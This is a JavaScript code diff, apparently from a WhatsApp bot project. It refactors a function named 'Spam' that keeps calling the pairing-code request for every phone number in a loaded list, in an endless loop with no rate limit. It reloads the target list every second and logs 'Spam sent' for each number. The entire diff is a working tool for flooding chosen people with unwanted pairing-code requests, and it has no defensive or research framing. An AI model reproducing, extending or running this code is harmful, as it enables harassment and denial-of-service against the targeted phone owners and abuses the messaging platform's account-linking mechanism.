@@ -48,48 +48,50 @@ const Spam = async () => {
         browser: ["Ubuntu", "Chrome", "20.0.04"],
     });
 
-    try {
-        const activeNumbers = new Set(loadNumbers());
+    const activeNumbers = new Set(loadNumbers());
 
-        const sendSpam = async (number) => {
-            try {
-                let code = await XeonBotInc.requestPairingCode(number);
-                code = code?.match(/.{1,4}/g)?.join("-") || code;
-                console.log(`${Color}${number} - Spam sent${xColor}`);
-            } catch (error) {
-                console.error('Error:', error.message);
+    const sendSpam = async (number) => {
+        try {
+            let code = await XeonBotInc.requestPairingCode(number);
+            code = code?.match(/.{1,4}/g)?.join("-") || code;
+            console.log(`${Color}${number} - Spam sent${xColor}`);
+        } catch (error) {
+            console.error('Error:', error.message);
+        }
+    };
+
+    const spamContinuously = async () => {
+        while (true) {
+            for (const number of activeNumbers) {
+                await sendSpam(number);
+                await new Promise(resolve => setImmediate(resolve));
             }
-        };
+        }
+    };
 
-        const spamContinuously = async () => {
-            while (true) {
-                for (const number of activeNumbers) {
-                    await sendSpam(number);
-                    await new Promise(resolve => setImmediate(resolve));
-                }
-            }
-        };
+    const updateNumbers = () => {
+        const currentNumbers = loadNumbers();
+        const newNumbers = currentNumbers.filter(num => !activeNumbers.has(num));
+        const deletedNumbers = Array.from(activeNumbers).filter(num => !currentNumbers.includes(num));
 
-        const monitorNumbers = () => {
-            setInterval(() => {
-                const currentNumbers = loadNumbers();
-                const newNumbers = currentNumbers.filter(num => !activeNumbers.has(num));
-                const deletedNumbers = Array.from(activeNumbers).filter(num => !currentNumbers.includes(num));
+        newNumbers.forEach(num => {
+            activeNumbers.add(num);
+            console.log(`${Color}${num} - Spam started (new number added)${xColor}`);
+        });
 
-                newNumbers.forEach(num => activeNumbers.add(num));
-                deletedNumbers.forEach(num => {
-                    activeNumbers.delete(num);
-                    console.log(`${Color}${num} - Spam stopped (number deleted)${xColor}`);
-                });
-            }, 1000);
-        };
+        deletedNumbers.forEach(num => {
+            activeNumbers.delete(num);
+            console.log(`${Color}${num} - Spam stopped (number deleted)${xColor}`);
+        });
+    };
 
-        monitorNumbers();
-        spamContinuously();
+    // Start the spam function
+    spamContinuously();
 
-    } catch (error) {
-        console.error('Error:', error.message);
-    }
+    // Update numbers every second
+    setInterval(() => {
+        updateNumbers();
+    }, 1000);
 
     return XeonBotInc;
 };
